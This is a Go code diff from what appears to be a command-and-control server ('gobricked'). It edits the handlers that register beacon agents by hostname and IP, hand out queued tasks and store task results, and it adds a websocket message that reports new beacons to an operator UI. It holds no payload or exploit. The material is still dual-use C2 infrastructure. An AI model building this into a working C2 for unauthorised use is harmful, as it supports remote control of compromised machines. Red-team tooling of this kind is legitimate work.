@@ -3,6 +3,7 @@ package router
 import (
 	"encoding/json"
 	"fmt"
+	"gobricked/pkg/relay"
 	"gobricked/pkg/util"
 	"log"
 	"net/http"
@@ -23,13 +24,25 @@ func RegisterAgentHandler(w http.ResponseWriter, r *http.Request) {
 	util.Mutex.Lock()
 	defer util.Mutex.Unlock()
 
-	agentID := uuid.New().String()
-	agent.ID = agentID
+	agent.ID = uuid.New().String()
 	agent.LastSeen = time.Now()
 
-	util.Agents[agentID] = agent
+	util.Agents[agent.ID] = agent
 
-	log.Printf("[+] Registered agent %s (%s) from (%s)\n", agentID, agent.Hostname, agent.IP)
+	// Sending update to UI
+	type Payload struct {
+		Type    string `json:"type"`
+		AgentID string `json:"agentID"`
+	}
+
+	msg := Payload{
+		Type:    "beacon_register",
+		AgentID: agent.ID,
+	}
+
+	relay.WSConn.WriteJSON(msg)
+
+	// Sending UUID back to agent
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(agent)
 }
@@ -48,7 +61,7 @@ func PostResultHandler(w http.ResponseWriter, r *http.Request) {
 	defer util.Mutex.Unlock()
 
 	util.Results = append(util.Results, result)
-	//log.Printf("[✓] Received result for task (%s) from agent (%s) > %s", result.TaskID, result.AgentID, result.Output)
+	// display the results to operator via websocket here?
 	w.WriteHeader(http.StatusCreated)
 }
 
@@ -61,7 +74,9 @@ func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
 	agentTasks := util.Tasks[agentID]
 	util.Tasks[agentID] = []util.Task{}
 
-	log.Printf("[>] Agent (%s) pulled (%d) task(s)", agentID, len(agentTasks))
+	//log.Printf("[>] Agent (%s) pulled (%d) task(s)", agentID, len(agentTasks))
+
+	// Send the tasks in JSON format to beacon
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(agentTasks)
 }
